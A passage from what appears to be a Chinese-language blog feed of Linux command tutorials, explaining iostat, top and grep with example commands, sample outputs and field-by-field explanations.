每秒写K字节数。是 wsect/s 的一半。 avgrq-sz: 平均每次设备I/O操作的数据大小 (扇区)。 avgqu-sz: 平均I/O队列长度。 await: 平均每次设备I/O操作的等待时间 (毫秒)。 svctm: 平均每次设备I/O操作的服务时间 (毫秒)。 %util: 一秒中有百分之多少的时间用于 I/O 操作，即被io消耗的cpu百分比 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：如果 %util 接近 100%，说明产生的I/O请求太多，I/O系统已经满负荷，该磁盘可能存在瓶颈。如果 svctm 比较接近 await，说明 I/O 几乎没有等待时间；如果 await 远大于 svctm，说明I/O 队列太长，io响应太慢，则需要进行必要优化。如果avgqu-sz比较大，也表示有当量io在等待。 实例2：定时显示所有信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat 2 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526272829303132333435363738394041[root@CT1186 ~]# iostat 2 3Linux 2.6.18-128.el5 (CT1186) 2012年12月28日avg-cpu: %user %nice %system %iowait %steal %idle 8.30 0.02 5.07 0.17 0.00 86.44Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda 22.73 43.70 487.42 674035705 7517947296sda1 0.00 0.00 0.00 2658 536sda2 0.11 3.74 3.51 57721595 54202216sda3 0.98 0.61 17.51 9454172 270023608sda4 0.00 0.00 0.00 6 0sda5 6.95 0.12 108.73 1924834 1677125640sda6 2.20 0.18 31.22 2837260 481488152sda7 12.48 39.04 326.44 602094508 5035107144avg-cpu: %user %nice %system %iowait %steal %idle 8.88 0.00 7.94 0.19 0.00 83.00Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda 6.00 0.00 124.00 0 248sda1 0.00 0.00 0.00 0 0sda2 0.00 0.00 0.00 0 0sda3 0.00 0.00 0.00 0 0sda4 0.00 0.00 0.00 0 0sda5 0.00 0.00 0.00 0 0sda6 0.00 0.00 0.00 0 0sda7 6.00 0.00 124.00 0 248avg-cpu: %user %nice %system %iowait %steal %idle 9.12 0.00 7.81 0.00 0.00 83.07Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda 4.00 0.00 84.00 0 168sda1 0.00 0.00 0.00 0 0sda2 0.00 0.00 0.00 0 0sda3 0.00 0.00 0.00 0 0sda4 0.00 0.00 0.00 0 0sda5 0.00 0.00 0.00 0 0sda6 4.00 0.00 84.00 0 168sda7 0.00 0.00 0.00 0 0 说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每隔 2秒刷新显示，且显示3次 实例3：显示指定磁盘信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -d sda1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@CT1186 ~]# iostat -d sda1Linux 2.6.18-128.el5 (CT1186) 2012年12月28日Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda1 0.00 0.00 0.00 2658 536 实例4：显示tty和Cpu信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@CT1186 ~]# iostat -tLinux 2.6.18-128.el5 (CT1186) 2012年12月28日Time: 14时58分35秒avg-cpu: %user %nice %system %iowait %steal %idle 8.30 0.02 5.07 0.17 0.00 86.44Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtnsda 22.73 43.70 487.41 674035705 7517957864sda1 0.00 0.00 0.00 2658 536sda2 0.11 3.74 3.51 57721595 54202216sda3 0.98 0.61 17.51 9454172 270024344sda4 0.00 0.00 0.00 6 0sda5 6.95 0.12 108.73 1924834 1677128808sda6 2.20 0.18 31.22 2837260 481488712sda7 12.48 39.04 326.44 602094508 5035113248 实例5：以M为单位显示所有信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@CT1186 ~]# iostat -mLinux 2.6.18-128.el5 (CT1186) 2012年12月28日avg-cpu: %user %nice %system %iowait %steal %idle 8.30 0.02 5.07 0.17 0.00 86.44Device: tps MB_read/s MB_wrtn/s MB_read MB_wrtnsda 22.72 0.02 0.24 329119 3670881sda1 0.00 0.00 0.00 1 0sda2 0.11 0.00 0.00 28184 26465sda3 0.98 0.00 0.01 4616 131848sda4 0.00 0.00 0.00 0 0sda5 6.95 0.00 0.05 939 818911sda6 2.20 0.00 0.02 1385 235102sda7 12.48 0.02 0.16 293991 2458553 实例6：查看TPS和吞吐量信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -d -k 1 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@CT1186 ~]# iostat -d -k 1 1Linux 2.6.18-128.el5 (CT1186) 2012年12月28日Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtnsda 22.72 21.85 243.71 337017916 3758984340sda1 0.00 0.00 0.00 1329 268sda2 0.11 1.87 1.76 28860797 27101108sda3 0.98 0.31 8.75 4727086 135012508sda4 0.00 0.00 0.00 3 0sda5 6.95 0.06 54.37 962481 838566148sda6 2.20 0.09 15.61 1418630 240744712sda7 12.48 19.52 163.22 301047254 2517559596 说明： tps：该设备每秒的传输次数（Indicate the number of transfers per second that were issued to the device.）。“一次传输”意思是“一次I/O请求”。多个逻辑请求可能会被合并为“一次I/O请求”。“一次传输”请求的大小是未知的。 kB_read/s：每秒从设备（drive expressed）读取的数据量； kB_wrtn/s：每秒向设备（drive expressed）写入的数据量； kB_read：读取的总数据量；kB_wrtn：写入的总数量数据量； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些单位都为Kilobytes。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的例子中，我们可以看到磁盘sda以及它的各个分区的统计数据，当时统计的磁盘总TPS是22.73，下面是各个分区的TPS。（因为是瞬间值，所以总TPS并不严格等于各个分区TPS的总和） 实例7：查看设备使用率（%util）、响应时间（await）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -d -x -k 1 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@CT1186 ~]# iostat -d -x -k 1 1Linux 2.6.18-128.el5 (CT1186) 2012年12月28日Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await svctm %utilsda 0.44 38.59 0.40 22.32 21.85 243.71 23.37 0.04 1.78 4.20 9.54sda1 0.00 0.00 0.00 0.00 0.00 0.00 18.90 0.00 8.26 6.46 0.00sda2 0.36 0.43 0.11 0.01 1.87 1.76 63.57 0.01 63.75 1.94 0.02sda3 0.00 1.24 0.04 0.95 0.31 8.75 18.42 0.04 39.77 8.73 0.86sda4 0.00 0.00 0.00 0.00 0.00 0.00 2.00 0.00 19.67 19.67 0.00sda5 0.00 6.65 0.00 6.94 0.06 54.37 15.67 0.26 36.81 4.48 3.11sda6 0.00 1.71 0.01 2.19 0.09 15.61 14.29 0.03 12.40 5.84 1.28sda7 0.08 28.56 0.25 12.24 19.52 163.22 29.28 0.27 21.46 5.00 6.25 说明： rrqm/s： 每秒进行 merge 的读操作数目.即 delta(rmerge)/s wrqm/s： 每秒进行 merge 的写操作数目.即 delta(wmerge)/s r/s： 每秒完成的读 I/O 设备次数.即 delta(rio)/s w/s： 每秒完成的写 I/O 设备次数.即 delta(wio)/s rsec/s： 每秒读扇区数.即 delta(rsect)/s wsec/s： 每秒写扇区数.即 delta(wsect)/s rkB/s： 每秒读K字节数.是 rsect/s 的一半,因为每扇区大小为512字节.(需要计算) wkB/s： 每秒写K字节数.是 wsect/s 的一半.(需要计算) avgrq-sz：平均每次设备I/O操作的数据大小 (扇区).delta(rsect+wsect)/delta(rio+wio) avgqu-sz：平均I/O队列长度.即 delta(aveq)/s/1000 (因为aveq的单位为毫秒). await： 平均每次设备I/O操作的等待时间 (毫秒).即 delta(ruse+wuse)/delta(rio+wio) svctm： 平均每次设备I/O操作的服务时间 (毫秒).即 delta(use)/delta(rio+wio) %util： 一秒中有百分之多少的时间用于 I/O 操作,或者说一秒中有多少时间 I/O 队列是非空的，即 delta(use)/s/1000 (因为use的单位为毫秒) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 %util 接近 100%，说明产生的I/O请求太多，I/O系统已经满负荷，该磁盘可能存在瓶颈。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;idle小于70% IO压力就较大了，一般读取速度有较多的wait。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同时可以结合vmstat 查看查看b参数(等待资源的进程数)和wa参数(IO等待所占用的CPU时间的百分比，高过30%时IO压力高)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外 await 的参数也要多和 svctm 来参考。差的过高就一定有 IO 的问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;avgqu-sz 也是个做 IO 调优时需要注意的地方，这个就是直接每次操作的数据的大小，如果次数多，但数据拿的小的话，其实 IO 也会很小。如果数据拿的大，才IO 的数据会高。也可以通过 avgqu-sz × ( r/s or w/s ) = rsec/s or wsec/s。也就是讲，读定速度是这个来决定的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;svctm 一般要小于 await (因为同时等待的请求的等待时间被重复计算了)，svctm 的大小一般和磁盘性能有关，CPU/内存的负荷也会对其有影响，请求过多也会间接导致 svctm 的增加。await 的大小一般取决于服务时间(svctm) 以及 I/O 队列的长度和 I/O 请求的发出模式。如果 svctm 比较接近 await，说明 I/O 几乎没有等待时间；如果 await 远大于 svctm，说明 I/O 队列太长，应用得到的响应时间变慢，如果响应时间超过了用户可以容许的范围，这时可以考虑更换更快的磁盘，调整内核 elevator 算法，优化应用，或者升级 CPU。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;队列长度(avgqu-sz)也可作为衡量系统 I/O 负荷的指标，但由于 avgqu-sz 是按照单位时间的平均值，所以不能反映瞬间的 I/O 洪水。 形象的比喻： r/s+w/s 类似于交款人的总数 平均队列长度(avgqu-sz)类似于单位时间里平均排队人的个数 平均服务时间(svctm)类似于收银员的收款速度 平均等待时间(await)类似于平均每人的等待时间 平均I/O数据(avgrq-sz)类似于平均每人所买的东西多少 I/O 操作率 (%util)类似于收款台前有人排队的时间比例 设备IO操作:总IO(io)/s = r/s(读) +w/s(写) =1.46 + 25.28=26.74 平均每次设备I/O操作只需要0.36毫秒完成,现在却需要10.57毫秒完成，因为发出的 请求太多(每秒26.74个)，假如请求时同时发出的，可以这样计算平均等待时间: 平均等待时间=单个I/O服务器时间*(1+2+…+请求总数-1)/请求总数 每秒发出的I/0请求很多,但是平均队列就4,表示这些请求比较均匀,大部分处理还是比较及时。 实例8：查看cpu状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1iostat -c 1 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011[root@CT1186 ~]# iostat -c 1 3Linux 2.6.18-128.el5 (CT1186) 2012年12月28日avg-cpu: %user %nice %system %iowait %steal %idle 8.30 0.02 5.07 0.17 0.00 86.44avg-cpu: %user %nice %system %iowait %steal %idle 8.64 0.00 5.38 0.00 0.00 85.98avg-cpu: %user %nice %system %iowait %steal %idle 7.62 0.00 5.12 0.50 0.00 86.75]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- top]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F46.%20Linux%20%E5%91%BD%E4%BB%A4-%20top%2F</url>
    <content type="text"><![CDATA[Linux 命令- top&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;top命令是Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。下面详细介绍它的使用方法。top是一个动态显示过程,即可以通过用户按键来不断刷新当前状态.如果在前台执行该命令,它将独占前台,直到用户终止该程序为止.比较准确的说,top命令提供了实时的对系统处理器的状态监视.它将显示系统中CPU最“敏感”的任务列表.该命令可以按CPU使用.内存使用和执行时间对任务进行排序；而且该命令的很多特性都可以通过交互式命令或者在个人定制文件中进行设定. 1．命令格式1top [参数] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率、CPU占用率等 3．命令参数 -b 批处理 -c 显示完整的治命令 -I 忽略失效过程 -s 保密模式 -S 累积模式 -i&lt;时间&gt; 设置间隔时间 -u&lt;用户名&gt; 指定用户名 -p&lt;进程号&gt; 指定进程 -n&lt;次数&gt; 循环显示的次数 4．使用实例实例1：显示进程信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1top &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637383940[root@TG1704 log]# toptop - 14:06:23 up 70 days, 16:44, 2 users, load average: 1.25, 1.32, 1.35Tasks: 206 total, 1 running, 205 sleeping, 0 stopped, 0 zombieCpu(s): 5.9%us, 3.4%sy, 0.0%ni, 90.4%id, 0.0%wa, 0.0%hi, 0.2%si, 0.0%stMem: 32949016k total, 14411180k used, 18537836k free, 169884k buffersSwap: 32764556k total, 0k used, 32764556k free, 3612636k cached PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 28894 root 22 0 1501m 405m 10m S 52.2 1.3 2534:16 java 18249 root 18 0 3201m 1.9g 11m S 35.9 6.0 569:39.41 java 2808 root 25 0 3333m 1.0g 11m S 24.3 3.1 526:51.85 java 25668 root 23 0 3180m 704m 11m S 14.0 2.2 360:44.53 java 574 root 25 0 3168m 611m 10m S 12.6 1.9 556:59.63 java 1599 root 20 0 3237m 1.9g 11m S 12.3 6.2 262:01.14 java 1008 root 21 0 3147m 842m 10m S 0.3 2.6 4:31.08 java 13823 root 23 0 3031m 2.1g 10m S 0.3 6.8 176:57.34 java 28218 root 15 0 12760 1168 808 R 0.3 0.0 0:01.43 top 29062 root 20 0 1241m 227m 10m S 0.3 0.7 2:07.32 java 1 root 15 0 10368 684 572 S 0.0 0.0 1:30.85 init 2 root RT -5 0 0 0 S 0.0 0.0 0:01.01 migration/0 3 root 34 19 0 0 0 S 0.0 0.0 0:00.00 ksoftirqd/0 4 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/0 5 root RT -5 0 0 0 S 0.0 0.0 0:00.80 migration/1 6 root 34 19 0 0 0 S 0.0 0.0 0:00.00 ksoftirqd/1 7 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/1 8 root RT -5 0 0 0 S 0.0 0.0 0:20.59 migration/2 9 root 34 19 0 0 0 S 0.0 0.0 0:00.09 ksoftirqd/2 10 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/2 11 root RT -5 0 0 0 S 0.0 0.0 0:23.66 migration/3 12 root 34 19 0 0 0 S 0.0 0.0 0:00.03 ksoftirqd/3 13 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/3 14 root RT -5 0 0 0 S 0.0 0.0 0:20.29 migration/4 15 root 34 19 0 0 0 S 0.0 0.0 0:00.07 ksoftirqd/4 16 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/4 17 root RT -5 0 0 0 S 0.0 0.0 0:23.07 migration/5 18 root 34 19 0 0 0 S 0.0 0.0 0:00.07 ksoftirqd/5 19 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/5 20 root RT -5 0 0 0 S 0.0 0.0 0:17.16 migration/6 21 root 34 19 0 0 0 S 0.0 0.0 0:00.05 ksoftirqd/6 22 root RT -5 0 0 0 S 0.0 0.0 0:00.00 watchdog/6 23 root RT -5 0 0 0 S 0.0 0.0 0:58.28 migration/7 说明：统计信息区：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前五行是当前系统情况整体的统计信息区。下面我们看每一行信息的具体意义。 第一行，任务队列信息，同 uptime 命令的执行结果，具体参数说明情况如下： 14:06:23 — 当前系统时间 up 70 days, 16:44 — 系统已经运行了70天16小时44分钟（在这期间系统没有重启过的吆！） 2 users — 当前有2个用户登录系统 load average: 1.15, 1.42, 1.44 — load average后面的三个数分别是1分钟、5分钟、15分钟的负载情况。 load average数据是每隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。 第二行，Tasks — 任务（进程），具体信息说明如下： 系统现在共有206个进程，其中处于运行中的有1个，205个在休眠（sleep），stoped状态的有0个，zombie状态（僵尸）的有0个。 第三行，cpu状态信息，具体属性说明如下： 5.9%us — 用户空间占用CPU的百分比。 3.4% sy — 内核空间占用CPU的百分比。 0.0% ni — 改变过优先级的进程占用CPU的百分比 90.4% id — 空闲CPU百分比 0.0% wa — IO等待占用CPU的百分比 0.0% hi — 硬中断（Hardware IRQ）占用CPU的百分比 0.2% si — 软中断（Software Interrupts）占用CPU的百分比 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：在这里CPU的使用比率和windows概念不同，需要理解linux系统用户空间和内核空间的相关知识！ 第四行,内存状态，具体信息如下： 32949016k total — 物理内存总量（32GB） 14411180k used — 使用中的内存总量（14GB） 18537836k free — 空闲内存总量（18GB） 169884k buffers — 缓存的内存量 （169M） 第五行，swap交换分区信息，具体信息说明如下： 32764556k total — 交换区总量（32GB） 0k used — 使用的交换区总量（0K） 32764556k free — 空闲交换区总量（32GB） 3612636k cached — 缓冲的交换区总量（3.6GB） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第四行中使用中的内存总量（used）指的是现在系统内核控制的内存数，空闲内存总量（free）是内核还未纳入其管控范围的数量。纳入内核管理的内存不见得都在使用中，还包括过去使用过的现在可以被重复利用的内存，内核并不把这些可被重新使用的内存交还到free中去，因此在linux上free内存会越来越少，但不用为此担心。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果出于习惯去计算可用内存数，这里有个近似的计算公式：第四行的free + 第四行的buffers + 第五行的cached，按这个公式此台服务器的可用内存：18537836k +169884k +3612636k = 22GB左右。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了。 第六行，空行。第七行以下：各进程（任务）的状态监控，项目列信息说明如下： PID — 进程id USER — 进程所有者 PR — 进程优先级 NI — nice值。负值表示高优先级，正值表示低优先级 VIRT — 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES RES — 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA SHR — 共享内存大小，单位kb S — 进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程 %CPU — 上次更新到现在的CPU时间占用百分比 %MEM — 进程使用的物理内存百分比 TIME+ — 进程使用的CPU时间总计，单位1/100秒 COMMAND — 进程名称（命令名/命令行） 其他使用技巧：1.多U多核CPU监控&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在top基本视图中，按键盘数字“1”，可监控每个逻辑CPU的状况： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;观察上图，服务器有16个逻辑CPU，实际上是4个物理CPU。再按数字键1，就会返回到top基本视图界面。 2.高亮显示当前运行进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;敲击键盘“b”（打开/关闭加亮效果），top的视图变化如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发现进程id为2570的“top”进程被加亮了，top进程就是视图第二行显示的唯一的运行态（runing）的那个进程，可以通过敲击“y”键关闭或打开运行态进程的加亮效果。 3.进程字段排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认进入top时，各进程是按照CPU的占用量来排序的，在下图中进程ID为28894的java进程排在第一（cpu占用142%），进程ID为574的java进程排在第二（cpu占用16%）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;敲击键盘“x”（打开/关闭排序列的加亮效果），top的视图变化如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到，top默认的排序列是“%CPU”。 4. 通过”shift + &gt;”或”shift + &lt;”可以向右或左改变排序列&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下图是按一次”shift + &gt;”的效果图,视图现在已经按照%MEM来排序。 实例2：显示 完整命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1top -c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 实例3：显示指定的进程信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1top -p 574 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 5.top交互命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在top 命令执行过程中可以使用的一些交互命令。这些命令都是单字母的，如果在命令行中使用了s 选项， 其中一些命令可能会被屏蔽。 h 显示帮助画面，给出一些简短的命令总结说明 k 终止一个进程。 i 忽略闲置和僵死进程。这是一个开关式命令。 q 退出程序 r 重新安排一个进程的优先级别 S 切换到累计模式 s 改变两次刷新之间的延迟时间（单位为s），如果有小数，就换算成m s。输入0值则系统将不断刷新，默认值是5 s f或者F 从当前显示中添加或者删除项目 o或者O 改变显示项目的顺序 l 切换显示平均负载和启动时间信息 m 切换显示内存信息 t 切换显示进程和CPU状态信息 c 切换显示命令名称和完整命令行 M 根据驻留内存大小进行排序 P 根据CPU使用百分比大小进行排序 T 根据时间/累计时间进行排序 W 将当前设置写入~/.toprc文件中]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- grep]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F41.%20Linux%20%E5%91%BD%E4%BB%A4-%20grep%2F</url>
    <content type="text"><![CDATA[&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中grep命令是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹 配的行打印出来。grep全称是Global Regular Expression Print，表示全局正则表达式版本，它的使用权限是所有用户。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;grep的工作方式是这样的，它在一个或多个文件中搜索字符串模板。如果模板包括空格，则必须被引用，模板后的所有字符串被看作文件名。搜索的结果被送到标准输出，不影响原文件内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;grep可用于shell脚本，因为grep通过返回一个状态值来说明搜索的状态，如果模板搜索成功，则返回0，如果搜索不成功，则返回1，如果搜索的文件不存在，则返回2。我们利用这些返回值就可进行一些自动化的文本处理工作。 1．命令格式1grep [option] pattern file 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于过滤/搜索的特定字符。可使用正则表达式能多种命令配合使用，使用上十分灵活。 3．命令参数 -a –text #不要忽略二进制的数据。 -A&lt;显示行数&gt; –after-context=&lt;显示行数&gt; #除了显示符合范本样式的那一列之外，并显示该行之后的内容。 -b –byte-offset #在显示符合样式的那一行之前，标示出该行第一个字符的编号。 -B&lt;显示行数&gt; –before-context=&lt;显示行数&gt; #除了显示符合样式的那一行之外，并显示该行之前的内容。 -c –count #计算符合样式的列数。 -C&lt;显示行数&gt; –context=&lt;显示行数&gt;或-&lt;显示行数&gt; #除了显示符合样式的那一行之外，并显示该行之前后的内容。 -d &lt;动作&gt; –directories=&lt;动作&gt; #当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作。 -e&lt;范本样式&gt; –regexp=&lt;范本样式&gt; #指定字符串做为查找文件内容的样式。 -E –extended-regexp #将样式为延伸的普通表示法来使用。 -f&lt;规则文件&gt; –file=&lt;规则文件&gt; #指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式。 -F –fixed-regexp #将样式视为固定字符串的列表。 -G –basic-regexp #将样式视为普通的表示法来使用。 -h –no-filename #在显示符合样式的那一行之前，不标示该行所属的文件名称。 -H –with-filename #在显示符合样式的那一行之前，表示该行所属的文件名称。 -i –ignore-case #忽略字符大小写的差别。 -l –file-with-matches #列出文件内容符合指定的样式的文件名称。 -L –files-without-match #列出文件内容不符合指定的样式的文件名称。 -n –line-number #在显示符合样式的那一行之前，标示出该行的列数编号。 -q –quiet或–silent #不显示任何信息。 -r –recursive #此参数的效果和指定“-d recurse”参数相同。 -s –no-messages #不显示错误信息。 -v –revert-match #显示不包含匹配文本的所有行。 -V –version #显示版本信息。 -w –word-regexp #只显示全字符合的列。 -x –line-regexp #只显示全列符合的列。 -y #此参数的效果和指定“-i”参数相同。 4．规则表达式grep的规则表达式: ^ #锚定行的开始 如：’^grep’匹配所有以grep开头的行。 $ #锚定行的结束 如：’grep$’匹配所有以grep结尾的行。 . #匹配一个非换行符的字符 如：’gr.p’匹配gr后接一个任意字符，然后是p。 * #匹配零个或多个先前字符 如：’*grep’匹配所有一个或多个空格后紧跟grep的行。 .* #一起用代表任意字符。 [] #匹配一个指定范围内的字符，如’[Gg]rep’匹配Grep和grep。 [^] #匹配一个不在指定范围内的字符，如：’[^A-FH-Z]rep’匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。 \(..\) #标记匹配字符，如’\(love\)’，love被标记为1。 \&lt; #锚定单词的开始，如:’\&lt;grep’匹配包含以grep开头的单词的行。 \&gt; #锚定单词的结束，如’grep\&gt;’匹配包含以grep结尾的单词的行。 x\{m\} #重复字符x，m次，如：’0\{5\}’匹配包含5个o的行。 x\{m,\} #重复字符x,至少m次，如：’o\{5,\}’匹配至少有5个o的行。 x\{m,n\} #重复字符x，至少m次，不多于n次，如：’o\{5,10\}’匹配5–10个o的行。 \w #匹配文字和数字字符，也就是[A-Za-z0-9]，如：’G\w*p’匹配以G后跟零个或多个文字或数字字符，然后是p。 \W #\w的反置形式，匹配一个或多个非单词字符，如点号句号等。 \b #单词锁定符，如: ‘\bgrep\b’只匹配grep。 POSIX字符:&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了在不同国家的字符编码中保持一至，POSIX(The Portable Operating System Interface)增加了特殊的字符类，如[:alnum:]是[A-Za-z0-9]的另一个写法。要把它们放到[]号内才能成为正则表达式，如[A- Za-z0-9]或[[:alnum:]]。在linux下的grep除fgrep外，都支持POSIX的字符类。 [:alnum:] #文字数字字符 [:alpha:] #文字字符 [:digit:] #数字字符 [:graph:] #非空字符（非空格、控制字符） [:lower:] #小写字符 [:cntrl:] #控制字符 [:print:] #非空字符（包括空格） [:punct:] #标点符号 [:space:] #所有空白字符（新行，空格，制表符） [:upper:] #大写字符 [:xdigit:] #十六进制数字（0-9，a-f，A-F） 5．使用实例实例1：查找指定进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -ef|grep svn &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# ps -ef|grep svnroot 4943 1 0 Dec05 ? 00:00:00 svnserve -d -r /opt/svndata/grape/root 16867 16838 0 19:53 pts/0 00:00:00 grep svn[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;第一条记录是查找出的进程；第二条结果是grep进程本身，并非真正要找的进程。 实例2：查找指定进程个数&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ps -ef|grep svn -cps -ef|grep -c svn &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# ps -ef|grep svn -c2[root@localhost ~]# ps -ef|grep -c svn 2[root@localhost ~]# 实例3：从文件中读取关键词进行搜索&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt | grep -f test2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@localhost test]# cat test.txt hnlinuxpeida.cnblogs.comubuntuubuntu linuxredhatRedhatlinuxmint[root@localhost test]# cat test2.txt linuxRedhat[root@localhost test]# cat test.txt | grep -f test2.txthnlinuxubuntu linuxRedhatlinuxmint[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出test.txt文件中含有从test2.txt文件中读取出的关键词的内容行 实例4：从文件中读取关键词进行搜索 且显示行号&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt | grep -nf test2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@localhost test]# cat test.txt hnlinuxpeida.cnblogs.comubuntuubuntu linuxredhatRedhatlinuxmint[root@localhost test]# cat test2.txt linuxRedhat[root@localhost test]# cat test.txt | grep -nf test2.txt1:hnlinux4:ubuntu linux6:Redhat7:linuxmint[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出test.txt文件中含有从test2.txt文件中读取出的关键词的内容行，并显示每一行的行号 实例5：从文件中查找关键词&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1grep 'linux' test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost test]# grep 'linux' test.txt hnlinuxubuntu linuxlinuxmint[root@localhost test]# grep -n 'linux' test.txt 1:hnlinux4:ubuntu linux7:linuxmint[root@localhost test]# 实例6：从多个文件中查找关键词&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1grep 'linux' test.txt test2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011[root@localhost test]# grep -n 'linux' test.txt test2.txt test.txt:1:hnlinuxtest.txt:4:ubuntu 